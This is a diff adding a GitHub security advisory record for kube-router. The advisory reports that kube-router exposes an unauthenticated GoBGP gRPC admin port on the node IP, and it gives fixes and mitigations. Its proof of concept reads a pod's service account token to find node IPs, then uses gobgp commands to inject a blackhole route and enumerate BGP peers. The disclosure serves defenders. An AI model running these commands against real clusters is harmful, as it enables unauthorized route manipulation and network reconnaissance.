@@ -1,0 +1,43 @@
+{
+  "id": "GHSA-v5mh-h5hx-7v92",
+  "modified": "2026-05-06T22:06:58.852196Z",
+  "published": "2026-05-06T21:52:47Z",
+  "summary": "kube-router: GoBGP gRPC Admin Port Exposed on Node Primary IP Without Authentication, Allowing Cluster-Wide BGP Route Injection",
+  "details": "## Summary\n\nWhen the kube-router routing controller starts (`--run-router`), it binds the GoBGP gRPC management server to the node's primary IP (e.g., `192.168.1.10:50051`) in addition to `127.0.0.1:50051`. The default admin port is `50051` and the server is enabled by default with no TLS and no authentication. Any pod in the cluster can reach node IPs and therefore call the GoBGP gRPC API to inject arbitrary BGP routes, enumerate peer configurations, add unauthorized BGP neighbors, or withdraw legitimate routes. While kube-router's BGP export policy of `ROUTE_ACTION_REJECT` limits the attack surface to the local node's GoBGP RIB, an attacker can still impact local routing decisions.\n\n## Details\n\nThe gRPC server is started unconditionally when `--run-router` is active. In `pkg/controllers/routing/network_routes_controller.go`, the `startBgpServer(true)` call at line 365 passes `grpcServer=true`, and the binding logic at lines 1057–1061 is:\n\n```go\n// pkg/controllers/routing/network_routes_controller.go:1057-1061\nif grpcServer \u0026\u0026 nrc.goBGPAdminPort != 0 {\n    nrc.bgpServer = gobgp.NewBgpServer(\n        gobgp.GrpcListenAddress(net.JoinHostPort(nrc.krNode.GetPrimaryNodeIP().String(),\n            strconv.FormatUint(uint64(nrc.goBGPAdminPort), 10)) + \",\" +\n            fmt.Sprintf(\"127.0.0.1:%d\", nrc.goBGPAdminPort)))\n}\n```\n\nThe default admin port is defined in `pkg/options/options.go`:\n\n```go\n// pkg/options/options.go:16\ndefaultGoBGPAdminPort uint16 = 50051\n```\n\nNo `gobgp.GrpcOption` is passed, meaning the gRPC server is started with no TLS credentials and no authentication interceptor. The GoBGP gRPC API (`gobgpapi`) exposes write-capable RPCs:\n\n- `AddPath` / `DeletePath` — inject or withdraw arbitrary BGP routes\n- `AddPeer` / `DeletePeer` / `UpdatePeer` — add/remove/modify BGP neighbors\n- `AddPolicy` / `DeletePolicy` — modify BGP routing policies\n- `ListPeer` / `ListPath` — enumerate all BGP peer configs and routing table entries\n\nkube-router runs as a DaemonSet with `hostNetwork: true`. This means the gRPC server is reachable at `\u003cnode-primary-ip\u003e:50051` from any pod in the cluster — pod-to-node-IP connectivity is guaranteed by any Kubernetes-conformant CNI. The kube-router documentation in `docs/pod-toolbox.md` explicitly demonstrates cross-node usage: \"To query a different node use `gobgp --host node02.mydomain`\" — confirming the port is reachable across the cluster, but providing no guidance on restricting access.\n\n## PoC\n\nFrom any pod running in the cluster:\n\n**Step 1 — Discover a node IP:**\n```bash\n# Using the Kubernetes API (available to all pods via service account)\ncurl -s -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" \\\n  https://kubernetes.default.svc/api/v1/nodes \\\n  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\\n  | grep -o '\"internalIP\":\"[^\"]*\"' | head -1\n# Expected output: \"internalIP\":\"192.168.1.10\"\n```\n\n**Step 2 — Connect to the GoBGP gRPC API and inject a blackhole route:**\n```bash\n# Install gobgp CLI (already available in kube-router image, or pull separately)\ngobgp --host 192.168.1.10:50051 global rib add -a ipv4 10.96.0.0/12 nexthop blackhole\n# Expected output: (no error — route accepted into the local GoBGP RIB)\n```\n\n**Step 3 — Verify route propagated to BGP table:**\n```bash\ngobgp --host 192.168.1.10:50051 global rib -a ipv4\n# Expected output: shows 10.96.0.0/12 blackhole route in the local RIB\n# This route does NOT propagate to peers or get added to the kernel routing table.\n```\n\n**Step 4 — Enumerate BGP peer configurations:**\n```bash\ngobgp --host 192.168.1.10:50051 neighbor\n# Expected output: lists all configured BGP peers, their ASNs,\n# session state, and configuration — without any Kubernetes credentials\n```\n\n## Impact\n\n- **BGP route injection**: An attacker with a pod in the cluster can inject arbitrary routes into a node's local BGP RIB. While these routes are not propagated to the rest of the cluster or injected into the kernel's routing table, this allows an attacker to pollute the BGP state on a node and could be combined with misconfigurations/other vulnerabilities for additional exploits (e.g. if the `ROUTE_ACTION_REJECT` policy set in kube-router was ever changed/relaxed)\n- **BGP peer enumeration**: All BGP neighbor configurations, including remote ASNs and session metadata, are accessible without authentication.\n- **BGP peer manipulation**: Unauthorized BGP peers can be added, and are persisted until manually removed. Legitimate peer configurations can be removed temporarily, though they are automatically restored each sync tick.) \n- **Routing policy modification**: BGP import/export policies can be modified within the local RIB\n\nThe blast radius is cluster-wide: a single successful `AddPath` call on one node affects all pods' network connectivity through iBGP propagation.\n\n## Recommended Fix\n\nThe gRPC server should not be bound to the node's primary IP by default. Options in order of preference:\n\n1. **Bind to localhost only** (minimal change, immediate security improvement):\n```go\n// pkg/controllers/routing/network_routes_controller.go:1057-1061\nif grpcServer \u0026\u0026 nrc.goBGPAdminPort != 0 {\n    nrc.bgpServer = gobgp.NewBgpServer(\n        gobgp.GrpcListenAddress(fmt.Sprintf(\"127.0.0.1:%d\", nrc.goBGPAdminPort)))\n}\n```\n\n2. **Disable by default** — change `defaultGoBGPAdminPort` from `50051` to `0`, requiring operators to explicitly opt in with `--gobgp-admin-port=50051` and accept responsibility for securing the port.\n\n3. **Add mTLS authentication** — pass `gobgp.GrpcOption(grpc.Creds(...))` to require client certificates before allowing gRPC calls.\n\nFor users on affected versions, mitigation options include:\n- Set `--gobgp-admin-port=0` to disable the gRPC server entirely\n- Add host-level iptables INPUT rules to block port 50051 from non-localhost sources\n- Apply Kubernetes NetworkPolicy (note: NodePort/host-network traffic bypasses NetworkPolicy in many CNI implementations)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/cloudnativelabs/kube-router",
+        "purl": "pkg:golang/github.com/cloudnativelabs/kube-router"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.9.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.8.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-v5mh-h5hx-7v92/GHSA-v5mh-h5hx-7v92.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/cloudnativelabs/kube-router/security/advisories/GHSA-v5mh-h5hx-7v92"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/cloudnativelabs/kube-router"
+    }
+  ]
+}
